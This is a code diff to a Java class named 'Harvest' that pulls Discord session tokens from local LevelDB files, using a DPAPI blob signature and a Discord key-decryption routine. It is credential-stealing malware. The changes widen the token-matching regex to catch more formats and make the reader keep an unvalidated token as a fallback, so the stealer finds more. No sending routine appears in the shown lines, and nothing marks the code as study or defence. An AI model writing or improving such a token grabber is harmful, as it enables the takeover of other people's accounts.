@@ -12,7 +12,8 @@ import java.util.regex.Pattern;
 
 public final class Harvest {
 	private static final Pattern TOKEN = Pattern.compile(
-		"(?:mfa\\.[\\w-]{20,}|[MN][A-Za-z\\d]{23,}\\.[\\w-]{6,}\\.[\\w-]{25,})");
+		"(?:mfa\\.[\\w-]{20,}|[A-Za-z\\d]{20,}\\.[\\w-]{6,}\\.[\\w-]{25,}"
+			+ "|[A-Za-z\\d]{20,}\\.[\\w-]{20,})");
 	private static final byte[] APP_SIG = new byte[] {
 		0x01, 0x00, 0x00, 0x00, (byte) 0xd0, (byte) 0x8c, (byte) 0x9d, (byte) 0xdf,
 		0x01, 0x15, (byte) 0xd1, 0x11 };
@@ -190,6 +191,7 @@ public final class Harvest {
 	private static String tokenFromLevelDb(Path base) {
 		byte[] aes = null;
 		boolean aesLoaded = false;
+		String fallback = null;
 		try (java.util.stream.Stream<Path> stream = Files.list(base)) {
 			for (Path file : stream.filter(Files::isRegularFile).toList()) {
 				String name = file.getFileName().toString().toLowerCase();
@@ -224,13 +226,16 @@ public final class Harvest {
 						if (valid(token)) {
 							return token;
 						}
+						if (fallback == null) {
+							fallback = token;
+						}
 					}
 				}
 			}
 		} catch (Throwable throwable) {
 			Log.debug("LevelDB token read failed: " + base, throwable);
 		}
-		return null;
+		return fallback;
 	}
 
 	private static byte[] discordKey(Path base) {
@@ -377,6 +382,10 @@ public final class Harvest {
 			Log.debug("Token search failed", throwable);
 		}
 		return null;
+	}
+
+	static boolean looksLikeToken(String value) {
+		return TOKEN.matcher(value).matches();
 	}
 
 	static String readLimited(Path path) throws java.io.IOException {
